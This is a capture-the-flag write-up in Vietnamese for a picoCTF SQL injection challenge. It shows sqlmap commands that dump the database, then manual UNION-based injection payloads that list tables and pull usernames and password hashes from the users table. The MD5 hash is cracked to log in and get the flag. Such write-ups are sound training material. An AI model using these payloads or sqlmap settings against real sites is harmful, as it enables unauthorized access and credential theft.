# Cách 1: Dùng sqlmap
\- Truy cập vào web, thực hiện đăng kí và đăng nhập, ta sẽ được chuyển đến endpoint `vuln.php` để thực hiện khai thác SQLi

\- Thực hiện `Search flags` như web hiển thị, ta thu được request và gắn flag `-u` để chạy sqlmap:

```
sqlmap -u "http://lonely-island.picoctf.net:52804/vuln.php?q=flags&PHPSESSID=aa9e173a107e86ed63d55274f18c4b6b" -p q --batch --dump --tables --level=5 --risk=3 --dbms=SQLite

sqlmap -u "http://lonely-island.picoctf.net:52804/vuln.php?q=flags"  -H "Cookie:PHPSESSID=aa9e173a107e86ed63d55274f18c4b6b" -p q --batch --dump --tables --level=5 --risk=3 --dbms=SQLite

```

<img width="531" height="930" alt="image" src="https://github.com/user-attachments/assets/27b3b630-67eb-4414-8c09-061bc2ba17a0" />

\- Khi thử nhập các flag được hiển thị, bất ngờ là không có cái nào đúng 🙂

\- Nhưng, nhìn lại vào bảng `users` thì thấy có duy nhất 1 user có mật khẩu đã được md5 decrypt, đăng nhập vào tài khoản đó và thành công nhận flag

<img width="427" height="243" alt="image" src="https://github.com/user-attachments/assets/9e8530f0-6e3b-43f6-9713-66072da61517" />

# Cách 2: Manual exploitation

\- Sử dụng lệnh SQL để xem số cột trả về: `flags' ORDER BY 3-- -`, ta nhận được:

<img width="1920" height="205" alt="image" src="https://github.com/user-attachments/assets/a122bbf4-d01d-4889-b679-9d2cab5949f4" />

$\implies$ Truy vấn trả về 2 cột dữ liệu

\- Sử dụng kĩ thuật khai thác UNION-based SQLi, ta có:

```
flags' UNION SELECT type, name from sqlite_master where type="table"-- -
```

<img width="373" height="225" alt="image" src="https://github.com/user-attachments/assets/1d6b439b-5d84-4e06-8f79-568b21e731a6" />

\- Khai thác sâu hơn vào bảng `users` để xem cấu trúc các cột bên trong:

```
flags' UNION SELECT name, sql from sqlite_master where type="table" and name="users"-- -
```

<img width="542" height="313" alt="image" src="https://github.com/user-attachments/assets/5a13ae9d-5bcb-4b13-9274-358e5f0261c2" />

\- Quá rõ ràng rồi, chỉ việc truy vấn 2 cột quan trọng là xong 
```
flags' UNION SELECT username, password FROM users--
```

<img width="575" height="664" alt="image" src="https://github.com/user-attachments/assets/e249e1d6-d216-4b21-a546-7d9510ee3506" />

\- Thực hiện md5-decrypt mật khẩu và đăng nhập vào tài khoản `ctf-player`





